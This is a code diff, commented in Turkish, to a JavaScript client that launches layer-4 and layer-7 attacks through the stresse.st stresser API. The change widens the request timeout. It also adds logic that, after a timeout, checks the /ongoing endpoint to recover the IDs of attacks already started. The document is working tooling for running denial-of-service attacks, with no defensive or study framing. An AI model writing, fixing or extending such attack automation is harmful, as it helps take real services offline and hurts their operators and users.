@@ -354,8 +354,9 @@ function buildApiUrl(apiToken, params) {
 
 async function startAttackApi(apiClient, params) {
   const url = buildApiUrl(params.apiToken, params);
-  // L4 saldirilari stresse.st'te daha uzun sure basliyor; L7'ye gore daha fazla timeout ver.
-  const timeout = params.layer === 'L7' ? 15000 : 60000;
+  // stresse.st'in /api ucu yuk altinda (ozellikle L7 methodlarda da) 15sn'yi
+  // asabiliyor; timeout turu olduruyor. L4/L7 icin esit, genis timeout ver.
+  const timeout = 60000;
   try {
     const res = await apiClient.get(url, { timeout });
     console.log(`[startAttackApi] status=${res.status} data=${JSON.stringify(res.data).slice(0, 400)}`);
@@ -432,6 +433,18 @@ async function launchAttacksGet(sessionId, params, concurrents, loopId = null) {
       concurrents
     });
   } catch (err) {
+    // Timeout'ta istek bizden dustu ama stresse.st saldirilari baslatmis olabilir.
+    // /ongoing uzerinden yeni ID'leri kurtarmayi dene; yoksa gercek hata say.
+    if (err.code === 'ECONNABORTED' || /timeout/i.test(err.message || '')) {
+      console.warn(`[launchAttacksGet] GET /api timeout; /ongoing'den kurtarma deneniyor...`);
+      await new Promise((r) => setTimeout(r, 4000));
+      const salvageIds = new Set(await fetchOngoingAttackIds(sessionId, params, 1000));
+      const recovered = [...salvageIds].filter((id) => !beforeIds.has(id)).slice(0, concurrents);
+      if (recovered.length > 0) {
+        console.log(`[launchAttacksGet] timeout'a ragmen ${recovered.length} saldiri kurtarildi`);
+        return { data: { status: 'success', recovered: true }, attackIds: recovered };
+      }
+    }
     console.error(`[launchAttacksGet] GET /api hata:`, err.message);
     throw err;
   }
